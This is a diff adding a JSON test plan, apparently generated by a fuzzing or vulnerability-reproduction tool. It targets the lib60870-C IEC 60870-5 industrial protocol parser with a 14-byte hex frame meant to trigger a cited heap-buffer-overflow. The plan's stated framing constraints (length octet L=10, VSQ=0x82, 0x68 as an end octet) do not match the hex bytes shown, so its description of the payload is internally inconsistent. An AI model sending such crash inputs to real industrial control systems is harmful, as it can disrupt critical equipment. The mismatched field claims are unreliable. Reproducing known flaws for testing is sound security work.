@@ -1,0 +1,60 @@
+{
+  "plan_id": "vk-plan-014",
+  "seed_id": "vk-plan-014",
+  "title": "VK-only Single Command: The issue was discovered in lib60870-C v2.4.0. A crafted IEC 60870-...",
+  "strategy": "field_interaction",
+  "target_operation": "Single Command",
+  "purpose": "Exercise issue-supported field interactions inside a plausible model-prior message structure.",
+  "evidence_ids": [
+    "issue:ghsa-7v97-jmwv-w5j7:ghsa-7v97-jmwv-w5j7-:1f798b317020",
+    "issue:ghsa-g3w7-x5rx-83xm:ghsa-g3w7-x5rx-83xm-:8bb9382fe4dc",
+    "issue:200:200-summary:348db1f37fe8",
+    "vk_task_context:task-contract:e5a446a8785a",
+    "issue:201:201-summary:798beefc9cab",
+    "issue:55:55-summary:bc272cfe2177"
+  ],
+  "messages": [
+    {
+      "index": 0,
+      "direction": "client_to_server",
+      "label": "Single Command request",
+      "hex": "680c000000000068030100000068",
+      "byte_length": 14,
+      "sha256": "d417d4ed900faf593fddcf6842ec86a4d8c3331ddf62a86f4c44447c3ec3a0b8"
+    }
+  ],
+  "expected_behavior": "Parser accepts sequence-form M_SP_NA_1 (TypeID 1) with VSQ claiming 2 objects but no IOA bytes after COT/CA; CS101_ASDU_getElement triggers InformationObject_ParseObjectAddress reading past buffer end (heap-buffer-overflow)",
+  "constraints_preserved": [
+    "0x68 start/end octets consistent with FT1.1 framing",
+    "APDU length octet L=10 preserved",
+    "Single-request sequence_shape",
+    "message_budget=1",
+    "VSQ=0x82 (2 objects claimed)",
+    "No sequence base IOA (trigger exact path from issue:200)"
+  ],
+  "issue_safety_notes": "Traces exact vulnerability trigger from GHSA-7V97-JMWV-W5J7 (InformationObject_ParseObjectAddress startIndex advance) and GHSA-G3W7-X5RX-83XM; no crash bytes copied; uses model-prior conservative form",
+  "sequence_sha256": "abf1593954ac6a37ebcb941ac354620eae59cbe8e202e2a2024aad6232a34f8c",
+  "total_bytes": 14,
+  "message_count_hint": 1,
+  "repair_notes": [],
+  "exact_issue_collision": false,
+  "plan_issue_refs": [
+    "GHSA-7V97-JMWV-W5J7"
+  ],
+  "_selection_score": 108.0,
+  "export": {
+    "sequence_encoding": "raw-binary-concat",
+    "sequence_file": "sequence.bin",
+    "encoded_sha256": "d417d4ed900faf593fddcf6842ec86a4d8c3331ddf62a86f4c44447c3ec3a0b8",
+    "encoded_bytes": 14,
+    "frames": [
+      {
+        "message_index": 0,
+        "frame_offset": 0,
+        "payload_offset": 0,
+        "payload_length": 14,
+        "frame_length": 14
+      }
+    ]
+  }
+}
